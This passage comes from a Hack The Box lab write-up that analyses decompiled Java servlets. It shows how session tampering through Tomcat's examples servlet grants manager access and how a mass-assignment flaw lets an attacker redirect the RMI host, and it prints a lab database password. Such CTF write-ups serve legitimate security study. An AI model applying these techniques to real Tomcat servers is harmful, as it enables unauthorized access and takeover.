<span class="mtk1">        </span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">getParameterMap</span><span class="mtk1">().</span><span class="mtk8">forEach</span><span class="mtk1">((k, v) </span><span class="mtk7 mtki">-&gt;</span><span class="mtk1"> parameterMap.</span><span class="mtk8">put</span><span class="mtk1">(k, v[</span><span class="mtk6">0</span><span class="mtk1">]));</span>
<span class="mtk1">        </span><span class="mtk8 mtku">Settings</span><span class="mtk1">.</span><span class="mtk8">updateBy</span><span class="mtk1">(</span><span class="mtk1">parameterMap</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8 mtku">RequestDispatcher</span><span class="mtk1"> </span><span class="mtk1">rd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">getRequestDispatcher</span><span class="mtk1">(</span><span class="mtk4">"/WEB-INF/jsp/configuration.jsp"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">setAttribute</span><span class="mtk1">(</span><span class="mtk4">"message"</span><span class="mtk1">, (</span><span class="mtk8 mtku">Object</span><span class="mtk1">)</span><span class="mtk4">"Settings updated"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk1">rd</span><span class="mtk1">.</span><span class="mtk8">include</span><span class="mtk1">((</span><span class="mtk8 mtku">ServletRequest</span><span class="mtk1">)</span><span class="mtk9 mtki">request</span><span class="mtk1">, (</span><span class="mtk8 mtku">ServletResponse</span><span class="mtk1">)</span><span class="mtk9 mtki">response</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk8">checkManager</span><span class="mtk1">(</span><span class="mtk8 mtku">HttpServletRequest</span><span class="mtk1"> </span><span class="mtk9 mtki">request</span><span class="mtk1">, </span><span class="mtk8 mtku">HttpServletResponse</span><span class="mtk1"> </span><span class="mtk9 mtki">response</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">IOException</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk1">isManager</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk1">bl</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">isManager</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">getSession</span><span class="mtk1">().</span><span class="mtk8">getAttribute</span><span class="mtk1">(</span><span class="mtk4">"s_IsLoggedInUserRoleManager"</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">isManager</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk9 mtki">response</span><span class="mtk1">.</span><span class="mtk8">sendRedirect</span><span class="mtk1">(</span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">getContextPath</span><span class="mtk1">() </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">"/panel"</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">isManager</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">destroy</span><span class="mtk1">() {</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>As can be seen, in both <code>doGet</code> and <code>doPost</code> there is a check to see if we have <code>s_IsLoggedInUserRoleManager</code> set in our session (it calls <code>checkManager</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8 mtku">ConfigurationServlet</span><span class="mtk1">.</span><span class="mtk8">checkManager</span><span class="mtk1">((</span><span class="mtk8 mtku">HttpServletRequest</span><span class="mtk1">)</span><span class="mtk9 mtki">request</span><span class="mtk1">, (</span><span class="mtk8 mtku">HttpServletResponse</span><span class="mtk1">)</span><span class="mtk9 mtki">response</span><span class="mtk1">)) {</span>  
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
</code></pre></div><h3 id="tomcat-and-nginx-exploitation">Tomcat and nginx exploitation</h3><p>We already know that the server is running Tomcat. Plus, on port 443 there is an nginx server acting as a reverse proxy (watch the initial <code>nmap</code> scan). There are vulnerabilities that can happen with this configuration:</p><ul><li>Path traversal: More information at <a target="_blank" href="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/">acunetix.com</a></li><li>Session modification: More information at <a target="_blank" href="https://www.acunetix.com/vulnerabilities/web/apache-tomcat-examples-directory-vulnerabilities/">acunetix.com</a></li></ul><p>Both of them are exploitable. We can try to access <code>/manager/html</code> (the administration panel in Tomcat):</p><p><img alt="RegistryTwo 18" src="/images/HTB/RegistryTwo/RegistryTwo-18.webp"></p><p>But since we don&rsquo;t know the credentials (typical ones do not work), we get a 401 error:</p><p><img alt="RegistryTwo 19" src="/images/HTB/RegistryTwo/RegistryTwo-19.webp"></p><p>Here we can cause a 404 error to leak the specific Tomcat version (9.0.2), in case it is useful later:</p><p><img alt="RegistryTwo 20" src="/images/HTB/RegistryTwo/RegistryTwo-20.webp"></p><p>The second vulnerability tries to access <code>/examples</code>, which has some <em>servlets</em> that can be used:</p><p><img alt="RegistryTwo 21" src="/images/HTB/RegistryTwo/RegistryTwo-21.webp"></p><p>The one that is critical is the <code>SessionServlet</code>, because it allows us to modify our session object on demand:</p><p><img alt="RegistryTwo 22" src="/images/HTB/RegistryTwo/RegistryTwo-22.webp"></p><p>For instance, we can set <code>s_IsLoggedInUserRoleManager</code> to <code>true</code>:</p><p><img alt="RegistryTwo 23" src="/images/HTB/RegistryTwo/RegistryTwo-23.webp"></p><p>And if we return to our profile, we now have a &ldquo;Configuration&rdquo; option:</p><p><img alt="RegistryTwo 24" src="/images/HTB/RegistryTwo/RegistryTwo-24.webp"></p><p>Here we are allowed to change the maximum amount of domains and the default <code>index.html</code> file (this might be helpful if we were to use an XSS attack):</p><p><img alt="RegistryTwo 25" src="/images/HTB/RegistryTwo/RegistryTwo-25.webp"></p><p>However, let&rsquo;s take a look again at <code>ConfigurationServlet</code>, more precisely, at <code>doPost</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">doPost</span><span class="mtk1">(</span><span class="mtk8 mtku">HttpServletRequest</span><span class="mtk1"> </span><span class="mtk9 mtki">request</span><span class="mtk1">, </span><span class="mtk8 mtku">HttpServletResponse</span><span class="mtk1"> </span><span class="mtk9 mtki">response</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">IOException</span><span class="mtk1">, </span><span class="mtk8 mtku">ServletException</span><span class="mtk1"> {</span>  
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8 mtku">ConfigurationServlet</span><span class="mtk1">.</span><span class="mtk8">checkManager</span><span class="mtk1">((</span><span class="mtk8 mtku">HttpServletRequest</span><span class="mtk1">)</span><span class="mtk9 mtki">request</span><span class="mtk1">, (</span><span class="mtk8 mtku">HttpServletResponse</span><span class="mtk1">)</span><span class="mtk9 mtki">response</span><span class="mtk1">)) {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk8 mtku">HashMap</span><span class="mtk1"> </span><span class="mtk1">parameterMap</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">HashMap</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">getParameterMap</span><span class="mtk1">().</span><span class="mtk8">forEach</span><span class="mtk1">((k, v) </span><span class="mtk7 mtki">-&gt;</span><span class="mtk1"> parameterMap.</span><span class="mtk8">put</span><span class="mtk1">(k, v[</span><span class="mtk6">0</span><span class="mtk1">]));</span>
<span class="mtk1">        </span><span class="mtk8 mtku">Settings</span><span class="mtk1">.</span><span class="mtk8">updateBy</span><span class="mtk1">(</span><span class="mtk1">parameterMap</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8 mtku">RequestDispatcher</span><span class="mtk1"> </span><span class="mtk1">rd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">getRequestDispatcher</span><span class="mtk1">(</span><span class="mtk4">"/WEB-INF/jsp/configuration.jsp"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">setAttribute</span><span class="mtk1">(</span><span class="mtk4">"message"</span><span class="mtk1">, (</span><span class="mtk8 mtku">Object</span><span class="mtk1">)</span><span class="mtk4">"Settings updated"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk1">rd</span><span class="mtk1">.</span><span class="mtk8">include</span><span class="mtk1">((</span><span class="mtk8 mtku">ServletRequest</span><span class="mtk1">)</span><span class="mtk9 mtki">request</span><span class="mtk1">, (</span><span class="mtk8 mtku">ServletResponse</span><span class="mtk1">)</span><span class="mtk9 mtki">response</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
</code></pre></div><p>These lines:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk8 mtku">HashMap</span><span class="mtk1"> </span><span class="mtk1">parameterMap</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">HashMap</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">getParameterMap</span><span class="mtk1">().</span><span class="mtk8">forEach</span><span class="mtk1">((k, v) </span><span class="mtk7 mtki">-&gt;</span><span class="mtk1"> parameterMap.</span><span class="mtk8">put</span><span class="mtk1">(k, v[</span><span class="mtk6">0</span><span class="mtk1">]));</span>  
<span class="mtk1">        </span><span class="mtk8 mtku">Settings</span><span class="mtk1">.</span><span class="mtk8">updateBy</span><span class="mtk1">(</span><span class="mtk1">parameterMap</span><span class="mtk1">);</span>
</code></pre></div><p>Are taking all the parameters coming in the web request and putting them into a <code>HashMap</code> object that is passed to <code>Settings.updateBy</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/*</span>
<span class="mtk3"> * Decompiled with CFR 0.150.</span>
<span class="mtk3"> * </span>
<span class="mtk3"> * Could not load the following classes:</span>
<span class="mtk3"> *  com.htb.hosting.utils.Constants</span>
<span class="mtk3"> *  com.htb.hosting.utils.StringUtil</span>
<span class="mtk3"> *  com.htb.hosting.utils.config.Settings</span>
<span class="mtk3"> */</span>
<span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">utils</span><span class="mtk5">.</span><span class="mtk8 mtku">config</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">utils</span><span class="mtk5">.</span><span class="mtk8 mtku">Constants</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">utils</span><span class="mtk5">.</span><span class="mtk8 mtku">StringUtil</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">io</span><span class="mtk5">.</span><span class="mtk8 mtku">FileInputStream</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">io</span><span class="mtk5">.</span><span class="mtk8 mtku">FileOutputStream</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">io</span><span class="mtk5">.</span><span class="mtk8 mtku">IOException</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">util</span><span class="mtk5">.</span><span class="mtk8 mtku">Map</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">util</span><span class="mtk5">.</span><span class="mtk8 mtku">Properties</span><span class="mtk1">;</span>

<span class="mtk3">/*</span>
<span class="mtk3"> * Exception performing whole class analysis ignor</span><span class="mtk3">ed.</span>
<span class="mtk3"> */</span>
<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Settings</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk8 mtku">Properties</span><span class="mtk1"> </span><span class="mtk1">prop</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">updateBy</span><span class="mtk1">(</span><span class="mtk8 mtku">Map</span><span class="mtk1">&lt;</span><span class="mtk8 mtku">String</span><span class="mtk1">, </span><span class="mtk8 mtku">String</span><span class="mtk1">&gt; </span><span class="mtk9 mtki">parameterMap</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk9 mtki">parameterMap</span><span class="mtk1">.</span><span class="mtk8">forEach</span><span class="mtk1">((k, v) </span><span class="mtk7 mtki">-&gt;</span><span class="mtk1"> prop.</span><span class="mtk8">put</span><span class="mtk1">(k, v));</span>
<span class="mtk1">            </span><span class="mtk1">prop</span><span class="mtk1">.</span><span class="mtk8">store</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">FileOutputStream</span><span class="mtk1">(Constants.SETTINGS_FILE), </span><span class="mtk6">null</span><span class="mtk1">);</span>  
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">IOException</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk1">e</span><span class="mtk1">.</span><span class="mtk8">printStackTrace</span><span class="mtk1">();</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>

    <span class="mtk3">// ...</span>

<span class="mtk1">}</span>
</code></pre></div><p>Basically, it takes all key-value pairs from the <code>HashMap</code> object and writes them into a file (<code>/etc/hosting.ini</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/*</span>
<span class="mtk3"> * Decompiled with CFR 0.150.</span>
<span class="mtk3"> * </span>
<span class="mtk3"> * Could not load the following classes:</span>
<span class="mtk3"> *  com.htb.hosting.utils.Constants</span>
<span class="mtk3"> */</span>
<span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">utils</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">io</span><span class="mtk5">.</span><span class="mtk8 mtku">File</span><span class="mtk1">;</span>

<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">interface</span><span class="mtk1"> </span><span class="mtk8 mtku">Constants</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">S_USER_ID</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"s_LoggedInUserUUID"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">S_USER_NAME</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"s_DisplayLoggedInUsernameSafe"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">S_IS_USER_ROLE_MGR</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"s_IsLoggedInUserRoleManager"</span><span class="mtk1">;</span>  
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">SAFE_FILE</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"safeFile"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">BASE_DIR</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"baseDir"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">EDIT_FILE</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"editFile"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">SELECTED_DOMAIN</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"domain"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">CREATE_DOMAIN</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"new"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">ROLE_MGR</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"manager"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">ROLE_CUSTOMER</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"customer"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">KEY_MAX_DOMAINS</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"domains.max"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">KEY_DOMAIN_TEMPLATE</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"domains.start-template"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">File</span><span class="mtk1"> </span><span class="mtk1">SETTINGS_FILE</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">File</span><span class="mtk1">(</span><span class="mtk4">"/etc/hosting.ini"</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Let&rsquo;s recall the contents of <code>/etc/hosting.ini</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#Mon Jan 30 21:05:01 GMT 2023</span>
<span class="mtk5">mysql.password<span>=<span class="mtk4">O8lBvQUBPU4CMbvJmYqY</span>
<span class="mtk5">rmi.host<span>=<span class="mtk4">registry.webhosting.htb</span>
<span class="mtk5">mysql.user<span>=<span class="mtk4">root</span>
<span class="mtk5">mysql.port<span>=<span class="mtk4">3306</span>
<span class="mtk5">mysql.host<span>=<span class="mtk4">localhost</span>
<span class="mtk5">domains.start-template<span>=<span class="mtk4">&lt;body&gt;\r\n&lt;h1&gt;It works\!&lt;/h1&gt;\r\n&lt;/body&gt;</span>  
<span class="mtk5">domains.max<span>=<span class="mtk4">5</span>
<span class="mtk5">rmi.port<span>=<span class="mtk4">9002</span>
</code></pre></div><p>Although the front-end page (JSP) only allows to change <code>domains.start-template</code> and <code>domains.max</code>, the <em>servlet</em> does not check these parameters. Therefore, we have a mass assignment vulnerability here, because we can modify any of the above configurations. The one that looks promising is the <code>rmi.host</code>, because we can point it to our attacker machine and tell the RMI client to execute a (malicious) method defined by us.</p><p>This is the code for the <code>RMIClientWrapper</code> class:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/*</span>
<span class="mtk3"> * Decompiled with CFR 0.150.</span>
<span class="mtk3"> * </span>
<span class="mtk3"> * Could not load the following classes:</span>
<span class="mtk3"> *  com.htb.hosting.rmi.FileService</span>
<span class="mtk3"> *  com.htb.hosting.rmi.RMIClientWrapper</span>
<span class="mtk3"> *  com.htb.hosting.utils.config.Settings</span>
<span class="mtk3"> */</span>
<span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">FileService</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">utils</span><span class="mtk5">.</span><span class="mtk8 mtku">config</span><span class="mtk5">.</span><span class="mtk8 mtku">Settings</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">registry</span><span class="mtk5">.</span><span class="mtk8 mtku">LocateRegistry</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">registry</span><span class="mtk5">.</span><span class="mtk8 mtku">Registry</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">util</span><span class="mtk5">.</span><span class="mtk8 mtku">logging</span><span class="mtk5">.</span><span class="mtk8 mtku">Logger</span><span class="mtk1">;</span>

<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">RMIClientWrapper</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">Logger</span><span class="mtk1"> </span><span class="mtk1">log</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> Logger.</span><span class="mtk8">getLogger</span><span class="mtk1">(</span><span class="mtk8 mtku">RMIClientWrapper</span><span class="mtk1">.</span><span class="mtk5">class</span><span class="mtk1">.</span><span class="mtk8">getSimpleName</span><span class="mtk1">());</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk8 mtku">FileService</span><span class="mtk1"> </span><span class="mtk8">get</span><span class="mtk1">() {</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">rmiHost</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">String</span><span class="mtk1">)</span><span class="mtk8 mtku">Settings</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1">.</span><span class="mtk5">class</span><span class="mtk1">, (</span><span class="mtk8 mtku">String</span><span class="mtk1">)</span><span class="mtk4">"rmi.host"</span><span class="mtk1">, </span><span class="mtk6">null</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">rmiHost</span><span class="mtk1">.</span><span class="mtk8">contains</span><span class="mtk1">(</span><span class="mtk4">".htb"</span><span class="mtk1">)) {</span>
<span class="mtk1">                </span><span class="mtk1">rmiHost</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"registry.webhosting.htb"</span><span class="mtk1">;</span>
<span class="mtk1">            }</span>
<span class="mtk1">            System.</span><span class="mtk8">setProperty</span><span class="mtk1">(</span><span class="mtk4">"java.rmi.server.hostname"</span><span class="mtk1">, </span><span class="mtk1">rmiHost</span><span class="mtk1">);</span>
<span class="mtk1">            System.</span><span class="mtk8">setProperty</span><span class="mtk1">(</span><span class="mtk4">"com.sun.management.jmxremote.rmi.port"</span><span class="mtk1">, </span><span class="mtk4">"9002"</span><span class="mtk1">);</span>
